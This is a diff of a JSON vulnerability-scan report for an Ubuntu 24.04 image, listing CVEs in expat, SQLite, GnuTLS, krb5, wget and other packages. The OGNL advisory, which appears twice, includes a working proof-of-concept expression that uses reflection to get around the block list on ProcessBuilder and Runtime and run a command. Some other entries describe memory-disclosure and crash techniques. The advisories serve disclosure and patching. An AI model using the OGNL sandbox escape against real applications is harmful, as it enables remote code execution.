-    "description": "libexpat before commit 13c5f63 contains a heap buffer over-read vulnerability in xmlparse.c. XML_ParseBuffer advances the parse buffer end with parser->m_bufferEnd += len using a caller-supplied length that is not validated against the allocated buffer size, so repeated XML_ParseBuffer calls move m_bufferEnd past the end of the heap allocation and subsequent parsing reads out of bounds. Reaching this path requires a parse buffer to already be present; otherwise XML_ParseBuffer returns XML_ERROR_NO_BUFFER. A buffer is present after a prior call to XML_GetBuffer, either directly (the common case) or indirectly through a prior XML_Parse call that allocates the buffer internally. The over-read discloses adjacent heap memory to the calling application, recovering heap pointers, libc function pointers, and code pointers sufficient to defeat ASLR and build further exploitation primitives."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-102633",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-102633?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "libexpat versions 2.7.2 through 2.8.5 contain an integer overflow vulnerability in expat_realloc() function on 32-bit platforms when computing allocation sizes. Attackers supplying malicious XML to applications parsing with vulnerable libexpat can cause heap buffer overflow, memory corruption, or denial of service."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-93990",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-93990?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "Expat before 2.8.5 fails to validate that a high surrogate in UTF-16 input is followed by a low surrogate, allowing malformed UTF-16 sequences to be accepted. Attackers can supply UTF-16 encoded XML containing lone high surrogates that consume the following code unit, causing Expat to pass unpaired surrogates to applications built with XML_UNICODE and to silently replace input characters in other builds."
+    "url": "https://scout.docker.com/v/CVE-2026-95209?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "Rejected reason: ** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue. Notes: none."
   },
   {
     "severity": "MEDIUM",
@@ -110,6 +326,22 @@
     "fixed_by": null,
     "url": "https://scout.docker.com/v/CVE-2026-95210?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
     "description": "GnuTLS v3.8.13 does not reject a critical keyUsage extension when it cannot be processed, such as when extnValue is an ASN.1 NULL (05 00) instead of a BIT STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its \"threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)\" policy."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-88647",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-88647?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "GnuTLS v3.8.13 can perhaps unexpectedly trust a certificate on the basis of Common Name when Subject Alternative Name has an SRV otherName (1.3.6.1.5.5.7.8.7) whose value is an OCTET STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its \"threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)\" policy."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-67693",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-67693?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "GnuTLS v3.8.13 does not reject end-entity X.509 certificates that contain a contradictory combination of Key Usage (KU) and Extended Key Usage (EKU). NOTE: the Supplier does not consider this an actionable security vulnerability because of its \"threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)\" policy."
   },
   {
     "severity": "MEDIUM",
@@ -129,30 +361,6 @@
   },
   {
     "severity": "MEDIUM",
-    "source_id": "CVE-2026-67693",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-67693?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "GnuTLS v3.8.13 does not reject end-entity X.509 certificates that contain a contradictory combination of Key Usage (KU) and Extended Key Usage (EKU). NOTE: the Supplier does not consider this an actionable security vulnerability because of its \"threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)\" policy."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-95209",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-95209?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "Rejected reason: ** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue. Notes: none."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-88647",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-88647?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "GnuTLS v3.8.13 can perhaps unexpectedly trust a certificate on the basis of Common Name when Subject Alternative Name has an SRV otherName (1.3.6.1.5.5.7.8.7) whose value is an OCTET STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its \"threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)\" policy."
-  },
-  {
-    "severity": "MEDIUM",
     "source_id": "CVE-2026-107161",
     "vulnerable_range": ">=0",
     "fixed_by": null,
@@ -161,19 +369,11 @@
   },
   {
     "severity": "MEDIUM",
-    "source_id": "CVE-2026-121876",
+    "source_id": "CVE-2026-112060",
     "vulnerable_range": ">=0",
     "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-121876?s=ubuntu&n=systemd&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "A flaw was found in the interaction between systemd-gpt-auto-generator and confidential computing guest VM images in OpenShift Sandboxed Containers (confidential peer pods). systemd-gpt-auto-generator automatically discovers and mounts GPT partitions by type GUID at boot with no user confirmation. In the confidential computing threat model, where the host/hypervisor is the adversary, a malicious host can inject partitions into the guest's virtual disk. Most critically, injecting a swap partition causes the guest kernel to page out TEE-encrypted memory to a host-controlled block device, breaking the confidentiality guarantee of the hardware TEE (AMD SEV-SNP, Intel TDX).  The PodVM images use a GPT-partitioned disk with dm-verity on the root partition. However, the roothash= kernel parameter only disables root auto-discovery — non-root partitions (swap, /home, /var, /srv, /var/tmp) are still auto-discovered and mounted. The generator is shipped unmasked in the  RHEL systemd-udev subpackage, and no kernel command line parameter in the measured UKI addon disables it. Additionally, the PodVM measurement script captures PCRs 3, 9, 11, and 12, but not PCR 5 (GPT partition table), so partition table modifications are not detected by remote attestation."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-119373",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-119373?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "SQLite before 3.54.0 built with FTS5 contains a heap buffer overflow in fts5MergeRowidLists() that undersizes the output buffer when merging detail=none prefix doclists. Attackers who can populate a detail=none FTS5 table with negative rowids and run a prefix MATCH query can write past the allocation, corrupting heap memory and crashing the process."
+    "url": "https://scout.docker.com/v/CVE-2026-112060?s=ubuntu&n=rtmpdump&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "librtmp in RTMPDump through 2.6 contains an out-of-bounds read and heap out-of-bounds write vulnerability because AMF3_Decode ignores AMF3 property decode failures. Malicious RTMP servers or man-in-the-middle attackers can send oversized AMF3 string lengths, and with the token option DecodeTEA corrupts heap memory and leaks heap bytes."
   },
   {
     "severity": "MEDIUM",
@@ -182,54 +382,6 @@
     "fixed_by": null,
     "url": "https://scout.docker.com/v/CVE-2026-112061?s=ubuntu&n=rtmpdump&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
     "description": "librtmp (RTMPDump) through 2.6 contains a heap out-of-bounds read vulnerability in AMFProp_Decode that reads an AMF0 strict-array element count before checking that four bytes remain. A malicious RTMP server or man in the middle can send an AMF0 body ending with a strict-array type byte and fewer than four trailing bytes to crash the client."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2021-31879",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2021-31879?s=ubuntu&n=wget&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "GNU Wget through 1.21.1 does not omit the Authorization header upon a redirect to a different origin, a related issue to CVE-2018-1000007."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-76642",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-76642?s=ubuntu&n=util-linux&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "util-linux versions through 2.41.5 and 2.42.2 fail to check mount helper exit status before running post-mount hooks, allowing unprivileged users to execute privileged operations on pre-existing filesystems. Attackers can exploit X-mount.idmap or X-mount.owner hooks to clone filesystems with inherited suid bits or modify target inode permissions after a helper fails, achieving privilege escalation."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-107778",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-107778?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "MIT Kerberos 5 (krb5) through 1.22.2 contains a NULL pointer dereference in make_cred_list() in rd_cred.c that allows authenticated Kerberos clients to crash services by sending mismatched KRB-CRED arrays. Attackers can send forwarded credentials with more tickets than ticket_info entries through gss_accept_sec_context() to crash GSS-API acceptor services, causing denial of service."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-107708",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-107708?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "MIT krb5 through 1.22.2 contains a NULL pointer dereference vulnerability in the KDC's get_pac_princ_with_realm() that returns success while leaving the client principal NULL on malformed names. A malicious or compromised cross-realm trusted KDC can send an S4U2Proxy request with a PAC carrying a malformed client name to crash krb5kdc and deny authentication."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-2219",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-2219?s=ubuntu&n=dpkg&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "It was discovered that dpkg-deb (a component of dpkg, the Debian package management system) does not properly validate the end of the data stream when uncompressing a zstd-compressed .deb archive, which may result in denial of service (infinite loop spinning the CPU)."
-  },
-  {
-    "severity": "MEDIUM",
-    "source_id": "CVE-2026-113730",
-    "vulnerable_range": "<=3.4.12",
-    "fixed_by": "3.4.13",
-    "url": "https://scout.docker.com/v/CVE-2026-113730?s=github&n=ognl&ns=ognl&t=maven&vr=%3C%3D3.4.12",
-    "description": "### Summary\n\nOGNL's optional *stricter invocation* mode maintains a block list that prevents expressions from directly calling methods on dangerous classes such as `Runtime`, `ProcessBuilder`, and `ClassLoader`. The block list filters on the **declaring class of the method OGNL invokes**. Because `java.lang.reflect.Method` (and `Constructor`/`Field`) are not on the list, an expression can use reflection as a proxy — `someMethod.invoke(target, args)` — to reach a blocked method. The real call (e.g. `ProcessBuilder.start()`) then executes inside the JDK reflection machinery and never passes back through OGNL's `invokeMethod`, so the block list never sees it.\n\n### Proof of concept\n\nUnder the default OGNL context (public-only access, stricter invocation enabled), the following expression creates a file even though a direct `new ProcessBuilder(...).start()` is blocked:\n\n```\n(#pb=new java.lang.ProcessBuilder({\"/usr/bin/touch\",\"rce-proof.txt\"}),\n #methods=@java.lang.ProcessBuilder@class.getMethods(),\n #names=#methods.{ #this.getName() },\n #startIdx=#names.indexOf(\"start\"),\n #methods[#startIdx].invoke(#pb, null))\n```\n\n### Impact and scope — please read carefully\n\n**This is hardening of a defense-in-depth secondary layer, not a break of OGNL's primary security boundary.**\n\nIn OGNL the stricter-invocation block list is a *secondary* mitigation. The **primary** access-control gate is the `MemberAccess` implementation supplied by the integrating framework or application, which OGNL consults on every constructor and method call. Frameworks that evaluate untrusted expressions are expected to install a restrictive `MemberAccess` — for example, Apache Struts' `SecurityMemberAccess`, which excludes dangerous classes and the `java.lang.reflect` package. Against such a `MemberAccess` this PoC is blocked at the very first step (the `new ProcessBuilder(...)` constructor), before reflection is ever reachable.\n\nThe default context that ships with OGNL intentionally allows all public members and is **not** designed to sandbox untrusted input. An application that evaluates attacker-controlled expressions with that permissive default already has many paths to code execution, and this technique is not required to achieve it.\n\n**You are affected only if all of the following hold:** (1) your application evaluates untrusted/attacker-controlled OGNL expressions, (2) it uses OGNL's default permissive `MemberAccess` (or an equivalently permissive one that allows `java.lang.reflect`), and (3) it relies on the stricter-invocation block list as its sandbox. **Properly configured consumers — including Apache Struts with its `SecurityMemberAccess` — are not affected.** The actual protection for untrusted-expression scenarios remains a correctly configured `MemberAccess`; the block list should not be treated as a sandbox.\n\n### Fix\n\n`java.lang.reflect.Method`, `java.lang.reflect.Constructor`, and `java.lang.reflect.Field` are added to the stricter-invocation block list, so reflection objects can no longer be used as invocation proxies in stricter mode. The `java.lang.invoke.MethodHandle` path was verified not to be exploitable (its signature-polymorphic `invoke`/`invokeExact` fail through OGNL's reflection-based invocation), so no additional classes are required.\n\n### Credit\n\nReported responsibly through Tidelift by 毛锐 (youyi.mr@alibaba-inc.com)."
   },
   {
     "severity": "MEDIUM",
@@ -249,6 +401,102 @@
   },
   {
     "severity": "MEDIUM",
+    "source_id": "CVE-2026-119375",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119375?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 contains an information disclosure vulnerability that allows attackers to read uninitialized page-cache memory by supplying a WAL file with an undersized page size. Attackers can craft a database and WAL file whose oversized record payload makes queries like substr() return stale bytes, disclosing other table rows and internal pointers."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119373",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119373?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 built with FTS5 contains a heap buffer overflow in fts5MergeRowidLists() that undersizes the output buffer when merging detail=none prefix doclists. Attackers who can populate a detail=none FTS5 table with negative rowids and run a prefix MATCH query can write past the allocation, corrupting heap memory and crashing the process."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119376",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119376?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 contains a stack exhaustion vulnerability that allows attackers to bypass the SQLITE_LIMIT_EXPR_DEPTH limit by chaining COLLATE postfix operators. Attackers can supply roughly 175,000 chained COLLATE operators in SQL or an untrusted database view to trigger unbounded recursion in sqlite3WalkExprNN() and crash the process."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119371",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119371?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 contains a stack exhaustion vulnerability that allows attackers to bypass the SQLITE_LIMIT_EXPR_DEPTH nesting limit because common table expressions are not counted against it. Attackers can supply a WITH clause chaining tens of thousands of CTEs, via plain SQL or a view in an untrusted database file, causing unbounded selectExpander() recursion that crashes the process."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119377",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119377?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 contains an authorization bypass vulnerability in lookupName() that invokes the authorizer only for the first joined table's USING column. Attackers able to submit SQL can query a shared USING column in a RIGHT or FULL JOIN to read columns denied via sqlite3_set_authorizer() SQLITE_READ restrictions."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119591",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119591?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 contains a stack exhaustion vulnerability in countOfViewOptimization() that allows attackers to crash the host process via count(*) over a large multi-row VALUES clause. Attackers supplying SQL or a database file with a crafted view can trigger deeply nested TK_PLUS expressions whose recursive freeing in sqlite3ExprDeleteNN() exhausts the C stack, causing denial of service."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119379",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119379?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 built with the session extension contains a heap buffer overflow vulnerability in sqlite3changeset_apply() that allows attackers to corrupt heap memory by supplying crafted changesets. Attackers can repeat a table name in a second changeset block with a larger column count, causing sessionUpdateFind() to memset past the undersized aUpdateMask allocation."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119372",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119372?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 built with FTS3/FTS4 and SQLITE_ENABLE_FTS3_PARENTHESIS contains a use-after-free vulnerability in fts3BestSnippet() caused by dangling cached position-list pointers. Attackers can run a full-text MATCH query combining OR and NEAR operators with snippet() to read freed heap memory and crash the process."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119374",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119374?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 built with FTS5 contains a heap buffer overflow in fts5DoSecureDelete() that allows attackers to write past the leaf page buffer via crafted footer key offsets. Attackers can supply a database file with a corrupted FTS5 index that, when deleted from with secure-delete enabled, corrupts heap memory and crashes the application."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119378",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-119378?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "SQLite before 3.54.0 contains a use-after-free vulnerability in the R-Tree extension that allows attackers to make applications use freed heap memory by manipulating the %_node shadow table. Attackers can supply a database declaring %_node WITHOUT ROWID or with a RAISE(IGNORE) trigger so nodeWrite() hashes nodes as 0, crashing the process after node splits."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-113730",
+    "vulnerable_range": "<=3.4.12",
+    "fixed_by": "3.4.13",
+    "url": "https://scout.docker.com/v/CVE-2026-113730?s=github&n=ognl&ns=ognl&t=maven&vr=%3C%3D3.4.12",
+    "description": "### Summary\n\nOGNL's optional *stricter invocation* mode maintains a block list that prevents expressions from directly calling methods on dangerous classes such as `Runtime`, `ProcessBuilder`, and `ClassLoader`. The block list filters on the **declaring class of the method OGNL invokes**. Because `java.lang.reflect.Method` (and `Constructor`/`Field`) are not on the list, an expression can use reflection as a proxy — `someMethod.invoke(target, args)` — to reach a blocked method. The real call (e.g. `ProcessBuilder.start()`) then executes inside the JDK reflection machinery and never passes back through OGNL's `invokeMethod`, so the block list never sees it.\n\n### Proof of concept\n\nUnder the default OGNL context (public-only access, stricter invocation enabled), the following expression creates a file even though a direct `new ProcessBuilder(...).start()` is blocked:\n\n```\n(#pb=new java.lang.ProcessBuilder({\"/usr/bin/touch\",\"rce-proof.txt\"}),\n #methods=@java.lang.ProcessBuilder@class.getMethods(),\n #names=#methods.{ #this.getName() },\n #startIdx=#names.indexOf(\"start\"),\n #methods[#startIdx].invoke(#pb, null))\n```\n\n### Impact and scope — please read carefully\n\n**This is hardening of a defense-in-depth secondary layer, not a break of OGNL's primary security boundary.**\n\nIn OGNL the stricter-invocation block list is a *secondary* mitigation. The **primary** access-control gate is the `MemberAccess` implementation supplied by the integrating framework or application, which OGNL consults on every constructor and method call. Frameworks that evaluate untrusted expressions are expected to install a restrictive `MemberAccess` — for example, Apache Struts' `SecurityMemberAccess`, which excludes dangerous classes and the `java.lang.reflect` package. Against such a `MemberAccess` this PoC is blocked at the very first step (the `new ProcessBuilder(...)` constructor), before reflection is ever reachable.\n\nThe default context that ships with OGNL intentionally allows all public members and is **not** designed to sandbox untrusted input. An application that evaluates attacker-controlled expressions with that permissive default already has many paths to code execution, and this technique is not required to achieve it.\n\n**You are affected only if all of the following hold:** (1) your application evaluates untrusted/attacker-controlled OGNL expressions, (2) it uses OGNL's default permissive `MemberAccess` (or an equivalently permissive one that allows `java.lang.reflect`), and (3) it relies on the stricter-invocation block list as its sandbox. **Properly configured consumers — including Apache Struts with its `SecurityMemberAccess` — are not affected.** The actual protection for untrusted-expression scenarios remains a correctly configured `MemberAccess`; the block list should not be treated as a sandbox.\n\n### Fix\n\n`java.lang.reflect.Method`, `java.lang.reflect.Constructor`, and `java.lang.reflect.Field` are added to the stricter-invocation block list, so reflection objects can no longer be used as invocation proxies in stricter mode. The `java.lang.invoke.MethodHandle` path was verified not to be exploitable (its signature-polymorphic `invoke`/`invokeExact` fail through OGNL's reflection-based invocation), so no additional classes are required.\n\n### Credit\n\nReported responsibly through Tidelift by 毛锐 (youyi.mr@alibaba-inc.com)."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2021-31879",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2021-31879?s=ubuntu&n=wget&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "GNU Wget through 1.21.1 does not omit the Authorization header upon a redirect to a different origin, a related issue to CVE-2018-1000007."
+  },
+  {
+    "severity": "MEDIUM",
     "source_id": "CVE-2026-18508",
     "vulnerable_range": ">=0",
     "fixed_by": null,
@@ -265,19 +513,27 @@
   },
   {
     "severity": "LOW",
-    "source_id": "CVE-2026-105712",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-105712?s=ubuntu&n=gnupg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "gpgtar in GnuPG before 2.5.19 can allow file overwrite via crafted data in an archive. When extracting an untrusted archive with --directory (aka -C) into an existing directory containing a pre-existing symlink, gpgtar can follow that symlink and create or overwrite a file outside the selected extraction directory. The write is limited by the extraction user's filesystem permissions. An archive extracted into a fresh empty directory does not have this risk."
-  },
-  {
-    "severity": "LOW",
     "source_id": "CVE-2026-40228",
     "vulnerable_range": ">=0",
     "fixed_by": null,
     "url": "https://scout.docker.com/v/CVE-2026-40228?s=ubuntu&n=systemd&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
     "description": "In systemd 259, systemd-journald can send ANSI escape sequences to the terminals of arbitrary users when a \"logger -p emerg\" command is executed, if ForwardToWall=yes is set."
+  },
+  {
+    "severity": "LOW",
+    "source_id": "CVE-2024-56433",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2024-56433?s=ubuntu&n=shadow&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid."
+  },
+  {
+    "severity": "LOW",
+    "source_id": "CVE-2026-105712",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-105712?s=ubuntu&n=gnupg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "gpgtar in GnuPG before 2.5.19 can allow file overwrite via crafted data in an archive. When extracting an untrusted archive with --directory (aka -C) into an existing directory containing a pre-existing symlink, gpgtar can follow that symlink and create or overwrite a file outside the selected extraction directory. The write is limited by the extraction user's filesystem permissions. An archive extracted into a fresh empty directory does not have this risk."
   },
   {
     "severity": "LOW",
@@ -294,13 +550,5 @@
     "fixed_by": null,
     "url": "https://scout.docker.com/v/CVE-2026-16599?s=ubuntu&n=wget&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
     "description": "GNU wget is vulnerable to denial of service in its FTP OPIE/S-KEY authentication functionality. The server-supplied sequence number from the FTP challenge line is used as an iteration count for an MD5 key-derivation loop without any upper bound validation. A malicious FTP server or a network attacker positioned to intercept FTP traffic can send a crafted OPIE challenge with a sequence number near INT_MAX, causing wget to perform up to approximately 2.1 billion MD5 computations and suspend for some time. The --timeout option does not mitigate this because it applies only to network I/O, not CPU computation.   This issue was fixed in commit e9697d98e7249b0f68a6be040a4f3dcc5bc101fa"
-  },
-  {
-    "severity": "LOW",
-    "source_id": "CVE-2024-56433",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2024-56433?s=ubuntu&n=shadow&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid."
   }
 ]
